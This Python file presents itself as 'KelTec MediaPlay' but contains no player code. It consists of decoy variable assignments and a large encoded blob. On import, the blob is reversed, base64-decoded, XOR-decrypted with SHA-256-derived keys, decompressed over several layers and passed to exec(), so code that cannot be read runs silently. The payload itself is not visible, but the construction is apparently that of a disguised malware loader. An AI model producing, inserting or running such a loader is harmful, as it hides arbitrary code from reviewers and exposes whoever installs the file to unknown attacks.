# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 230654 ^ 880336
_lx1_1 = len("7cbd4c")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-255539)
_lx3_3 = 414493 * 0
_lx4_4 = 226783 ^ 985318
_K = '59cc5e8d7102d2694e4e702a51885a6c51c37dcf5fead1bd74d844a307b24891'
_M = 'fHGbuwhHS/D7IQ=='
_D = '==gVdAw2BBezNHdqIrop59OlvZpbZpnujAw1onLcHvZbd44KIAOxvH978TC+yQlY8HYxoGQVVRfF0m7/pk74cTzPLhn59hTvEhxhYkRHj4h8ulk0/qfYDVRl8LWilNjmVUa1rXBFmrQ746qctInTTQCyZAJURbveWi8W4uBwTPxqqKtDnIwZ0sDBUweKZKAK/HxaVlgVReZ4hMh9Ifgbun1E4VoeGV1kCmVBIyM+772dJqsYQ6fkuZi81fsh6hVjUIgs3yLC0JrUGu/aYN0ECd0wL4npvs5+S2A1w3ubXk0kU5a23zFtZ/rBgV+waOY+4HIBlMEgnhLNOd68N8ya8elI3mv2EfV9y7M8dA3kJRngKH55qpOMzLCbufuHsqTgY8FUJDyWrKzbcUG6G6q4Byl/P0dx9BTEt7B73L7AUMOXfM9AVsiWF0mJwLntotELaXoDyPsanyX0/QdHApn2ADkQGxn5S4ygpTBC7YIV1EaKzoYKcoW6B3UGAEVgWp3Bmz1JvKnTerS1JABkO354Bbt1tfTuRexVZFBLTZE+HtEizU6jWSUJOhXna4xKJ9JkKDga4joC6wuLfleE4HEeAYCK8PQUVX493KJcxY+v9BEY07CC6sgcM0k1UKbXX6oXYXFnuzRwy6ZStyzBaOUa1L8wDtNrlv1kJrgajellrvy0Xo3MHQyDyA3kQX8ti+8imjXHeqXWlBwnov1LW+zvJSNEOraQ4rm+jlBSQ2F7ITeOhWsQGZmIb8CTEApnE59a+REucaZApzLc2waiBaEHYJE4hitxfVyQdHB2lmdInVMIMSA68dKSALTJijVjfzZfWrIl5CCywGDacPQz+FixBtvlx9u2o3Z6bXl43aO/+fznbJFuwc5gTP1rG6WPAmwsfvdifeB2J4hY484exCYDUcDh9sxFtiXfSbV9httHwqzRYqIagdB6ALt0rXgv6ky8cdFFZsPlf0i0ECYGl0EqXfCg6H4nRRpmQoMekNOdjJQ4W7A/OtPouXKxFX/WJv6x/jPZydeU/lBE14wJMJF5MMRm1g8kh/bGq2gQ+o+jSUO4ItG/MTaQcku6O0tp4D3Xg9IOW23Neo2i1MXtIj722ijoLYQVgVQ5nVItIlXyUusxat89R4Wgr5nuKmgpHJSYnVUWIY4VtyE45S8IVfot0PY5TETVwex8weEHeIfyUEknbL5nTu3a1xtCSte0h3nJEG9wB3w6pCU78xDYq+/25iMKyEwWy1gvgVBtWuOM+dasgJf7cQ1ZoJw2k2u9zZ3FgitqfA+JofiqOumHrkifCdmtbflSGvIEdSqb9pUwFXEy11zQ+TBBc0pnwnu4xysg9LmpKGYs1umaGUaEL4cgepzoP/IdkXWcVzPC6mGktyv1yLSJPubFmd8bgFboiq9ODQGIJ2Y3JZ2WVuwvBJqI7UE7UgNeMGqX2HIDUnzbJfrjDHKrcII1KxAkiHZhOim7Jmp3ML0kp2QKDVM50cgOYaId4Ontk3kTjMag/RHsG4trEbQ2JhoFhDc/BKYlBoLeTwjs1xA5KbPpbA8Q/7dCbVo0FO7E6MwjtiVAt+prKsLEWJ/TMqKCarIFBNRCRT3HLvJwcH586/QY/1L2kBjqs+nxnCzwzRcXIKh3KUcwAuUVI9w3KZRWutytkP+LmtfesCRpAm3T6h3apbPVDUa3ct169jOI9lt7J2avMTUF1zQWELniWsr6vKAEzavu0UwHmFpUiJYnZozyGjfhE+tvnWdDON0mQV4Q08rg/FoZ8vamAeZYh/XKoZ2SNgoHLcxW271DSGvlew/qGWnZ3fSaoDGf+4xAkO3hLHda'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
